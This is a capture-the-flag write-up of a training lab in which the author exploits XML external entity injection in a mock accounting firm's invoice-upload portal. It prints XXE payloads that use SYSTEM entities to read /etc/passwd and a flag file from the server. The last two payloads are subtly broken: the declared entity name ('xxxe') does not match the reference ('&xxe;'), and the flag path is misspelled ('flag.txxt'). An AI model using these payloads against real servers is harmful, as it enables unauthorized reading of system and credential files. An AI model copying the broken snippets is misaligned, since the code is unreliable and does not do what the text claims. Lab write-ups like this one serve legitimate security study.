---
title: "Webverselabs Margins & Sons CPA Challenge XXE "
date: 2026-05-16 00:00:00 +0000
categories: [Webverselabs]
tags: [Webverselabs , Hard , Challenge , Web_Attacks ]
---


## Scenario : 

Margins & Sons CPA has filed quarterlies for mid-sized Cleveland firms since 1986 — three partners, a bullpen of CPAs, and a client portal the senior partner's nephew stood up in 2003 and has been "good enough" ever since. Clients submit their invoice batches as XML for processing, the receipt screen says "submitted for processing," and nothing else ever comes back. Whatever the portal does with the file after that is between the portal and the bookkeeper.


## Solution : 


<img width="1348" height="878" alt="image" src="https://github.com/user-attachments/assets/0a8190fc-a0f6-4645-a553-ceaf73d99f27" />


From browsing the application , we see that we can submit some sort of Invoice in XML format , which is a huge indicator that this challenge is about XXE , now first thing , we should create an account to be able to better explore the application features . 


<img width="1172" height="780" alt="image" src="https://github.com/user-attachments/assets/d8b6c562-8747-4705-ae06-52504c8f434c" />


We see that we can submit invoices in an xml format once we are logged in , they even gave us Invoice examples , that we can use . 


<img width="1107" height="876" alt="image" src="https://github.com/user-attachments/assets/af7c5b63-6aa1-4ea3-a7b4-44d04ee80cf5" />


Now without modifying anything i uploaded the generic Invoice to see what information is returned to us exactly , to see where to inject our reference exactly if we were to do an XXE . 

```bash
<?xml version="1.0" encoding="UTF-8"?>
<invoice>
  <customer>Brennan Landscape Supply, LLC</customer>
  <period>2003-04</period>
  <lineItems>
    <lineItem>
      <sku>MULCH-3CF</sku>
      <description>Hardwood mulch, 3 cu. ft. bag</description>
      <quantity>144</quantity>
      <amount>618.24</amount>
    </lineItem>
    <lineItem>
      <sku>TOPSOIL-1CY</sku>
      <description>Screened topsoil, 1 cu. yd.</description>
      <quantity>6</quantity>
      <amount>204.00</amount>
    </lineItem>
  </lineItems>
</invoice>
```


<img width="1213" height="727" alt="image" src="https://github.com/user-attachments/assets/a604586c-cf2e-475b-850b-0bedc560daea" />


Now , if we go back to our Dashboard we can view the newly submitted invoices .


<img width="1147" height="799" alt="image" src="https://github.com/user-attachments/assets/24169e3c-313e-4dbf-a492-683fcaba00be" />


We see that the field Submitted , Customer are both returned to us , now to test for XXE , i added a new entity inside the DOCTYPE block and referenced it inside the original request to see if it gets referenced , i started simple , replacing the name with something like HELLO_Workssss to see if it gets reflected . 


```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE invoice [
  <!ENTITY xxe "HELLO_Workssss">
]>
<invoice>
  <customer>&xxe;</customer>
  <period>2003-04</period>
  <lineItems>
    <lineItem>
      <sku>MULCH-3CF</sku>
      <description>Hardwood mulch, 3 cu. ft. bag</description>
      <quantity>144</quantity>
      <amount>618.24</amount>
    </lineItem>
    <lineItem>
      <sku>TOPSOIL-1CY</sku>
      <description>Screened topsoil, 1 cu. yd.</description>
      <quantity>6</quantity>
      <amount>204.00</amount>
    </lineItem>
  </lineItems>
</invoice>
```

<img width="1278" height="799" alt="image" src="https://github.com/user-attachments/assets/a2b10dbf-b0ff-450d-9d80-9ba8f3550605" />

Perfect, it gets reflected back. Now let's try to see if we can achieve LFI and read /etc/passwd. We can use the SYSTEM keyword which tells the XML parser to fetch external resources — by pointing it to file:///etc/passwd using the file:// protocol, we're asking the server to read its own local file and return the contents.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE invoice [
  <!ENTITY xxxe SYSTEM "file:///etc/passwd">
]>
<invoice>
  <customer>&xxe;</customer>
  <period>2003-04</period>
  <lineItems>
.....
```

<img width="1131" height="847" alt="image" src="https://github.com/user-attachments/assets/a5962ca2-9e35-4b81-bfa1-cc436284d778" />

Perfect , we can read the /etc/passwd . The flag is usually in the root folder : /flag.txt so we just change the entity to file:///flag.txt and read it the same way.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE invoice [
  <!ENTITY xxxe SYSTEM "file:///flag.txxt">
```

<img width="1216" height="868" alt="image" src="https://github.com/user-attachments/assets/6477cccc-f2b0-4483-8f9b-9abe07e6947b" />


That was it for this challenge :) . See you in the next one . 

